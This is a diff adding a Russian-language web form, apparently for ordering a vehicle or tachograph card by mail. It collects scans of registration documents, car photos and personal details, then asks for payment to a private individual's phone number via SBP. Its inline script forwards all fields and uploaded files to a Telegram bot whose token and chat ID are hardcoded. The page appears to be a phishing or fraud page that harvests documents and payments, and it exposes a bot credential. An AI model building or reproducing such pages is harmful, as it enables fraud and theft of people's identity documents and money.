@@ -81,4 +81,104 @@
                                 </label>
                                 <label class="upload-box flex flex-col items-center justify-center py-8 bg-slate-50 border-2 border-slate-200 rounded-[2rem] cursor-pointer hover:border-blue-500 hover:bg-blue-50">
                                     <span class="text-4xl mb-3">📸</span>
-                                    <span class="text-
+                                    <span class="text-[13px] font-black text-slate-900 uppercase text-center">АВТО<br>СПЕРЕДИ</span>
+                                    <input type="file" id="car_front" accept="image/*" required class="hidden" onchange="updateLabel(this)">
+                                </label>
+                                <label class="upload-box flex flex-col items-center justify-center py-8 bg-slate-50 border-2 border-slate-200 rounded-[2rem] cursor-pointer hover:border-blue-500 hover:bg-blue-50">
+                                    <span class="text-4xl mb-3">🖼️</span>
+                                    <span class="text-[13px] font-black text-slate-900 uppercase text-center">АВТО<br>СЗАДИ</span>
+                                    <input type="file" id="car_back" accept="image/*" required class="hidden" onchange="updateLabel(this)">
+                                </label>
+                            </div>
+                        </div>
+
+                        <div class="space-y-2">
+                            <label class="section-label">Доп. информация</label>
+                            <textarea id="comment" placeholder="Напр: Тюнинг, ГБО или примечания..." class="w-full p-5 bg-slate-50 border-2 border-slate-100 rounded-2xl outline-none focus:border-blue-500 transition h-24 text-base font-medium"></textarea>
+                        </div>
+
+                        <button type="submit" id="btn-full" class="w-full bg-blue-600 text-white font-black py-7 rounded-[2rem] uppercase tracking-widest shadow-2xl active:scale-95 transition-all italic">Перейти к оплате</button>
+                    </form>
+                </div>
+
+                <div id="full-step-2" class="hidden text-center py-4">
+                    <div class="w-20 h-20 bg-blue-600 text-white rounded-full flex items-center justify-center mx-auto mb-6 text-3xl shadow-xl">💳</div>
+                    <h2 class="text-3xl font-black uppercase italic mb-2 tracking-tighter">Оплата СБП</h2>
+                    <div class="bg-slate-900 p-8 rounded-[2.5rem] my-8 shadow-2xl border-b-4 border-blue-500">
+                        <p class="text-2xl font-black text-white mb-1">+7 917 982-77-33</p>
+                        <p class="text-[10px] font-black text-blue-400 uppercase tracking-widest">Павел Р. (СБЕРБАНК)</p>
+                    </div>
+                    <form id="receipt-form" class="space-y-4">
+                        <label class="block p-8 border-4 border-dashed border-slate-100 rounded-[2.5rem] cursor-pointer bg-slate-50">
+                            <span class="block text-3xl mb-2">🧾</span>
+                            <span id="receipt-text" class="block text-[11px] font-black uppercase tracking-widest">Прикрепить чек</span>
+                            <input type="file" id="receipt_file" accept="image/*" required class="hidden" onchange="document.getElementById('receipt-text').innerText = 'ЧЕК ЗАГРУЖЕН ✓'; document.getElementById('receipt-text').classList.add('text-green-600')">
+                        </label>
+                        <button type="submit" id="btn-receipt" class="w-full bg-[#0f172a] text-white font-black py-7 rounded-[2rem] uppercase tracking-widest shadow-xl active:scale-95 transition-all italic">Я оплатил(а)</button>
+                    </form>
+                </div>
+
+                <div id="full-step-3" class="hidden text-center py-10">
+                    <div class="w-24 h-24 bg-green-500 text-white rounded-full flex items-center justify-center mx-auto mb-8 text-4xl shadow-2xl">✓</div>
+                    <h3 class="text-3xl font-black uppercase italic mb-4 tracking-tighter">Готово!</h3>
+                    <p class="text-slate-500 font-bold italic">Ваша заявка принята.<br>Ожидайте карту на почте.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const token = "8649772804:AAGjKzXa0-qQ0Ee4NcVOXDvUCSzkq-I_xXU";
+        const chat_id = "7512855086";
+
+        function updateLabel(input) {
+            const label = input.parentElement;
+            if (input.files.length > 0) {
+                label.classList.remove('bg-slate-50');
+                label.classList.add('bg-green-50', 'border-green-500');
+                label.querySelector('span:last-of-type').innerText = 'ЕСТЬ ✓';
+                label.querySelector('span:last-of-type').classList.add('text-green-600');
+            }
+        }
+
+        async function upload(id, caption) {
+            const el = document.getElementById(id);
+            if (el && el.files.length > 0) {
+                const fd = new FormData();
+                fd.append('chat_id', chat_id);
+                fd.append('document', el.files[0]);
+                fd.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: 'POST', body: fd });
+            }
+        }
+
+        document.getElementById('full-form').onsubmit = async (e) => {
+            e.preventDefault();
+            const b = document.getElementById('btn-full');
+            b.disabled = true; b.innerText = "ОТПРАВКА...";
+            
+            const msg = `🚛 НОВАЯ ЗАЯВКА\n📧 Почта: ${document.getElementById('finish_email').value}\n🚗 Пробег: ${document.getElementById('mileage').value}\n🛞 Шины: ${document.getElementById('tires').value}\n📟 Тахограф: ${document.getElementById('tach_model').value || 'Не указан'}\n🔢 Сер.номер: ${document.getElementById('tach_ser').value || 'Не указан'}\n📝 Коммент: ${document.getElementById('comment').value}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+                await upload('sts_1', 'СТС Лиц'); await upload('sts_2', 'СТС Обор');
+                await upload('car_front', 'Авто Перед'); await upload('car_back', 'Авто Зад');
+                document.getElementById('full-step-1').classList.add('hidden');
+                document.getElementById('full-step-2').classList.remove('hidden');
+                window.scrollTo(0,0);
+            } catch (err) { alert("Ошибка!"); b.disabled = false; b.innerText = "ПОВТОРИТЬ"; }
+        };
+
+        document.getElementById('receipt-form').onsubmit = async (e) => {
+            e.preventDefault();
+            const b = document.getElementById('btn-receipt');
+            b.disabled = true; b.innerText = "ОБРАБОТКА...";
+            try {
+                await upload('receipt_file', `✅ ЧЕК от ${document.getElementById('finish_email').value}`);
+                document.getElementById('full-step-2').classList.add('hidden');
+                document.getElementById('full-step-3').classList.remove('hidden');
+            } catch (err) { alert("Ошибка!"); b.disabled = false; }
+        };
+    </script>
+</body>
+</html>
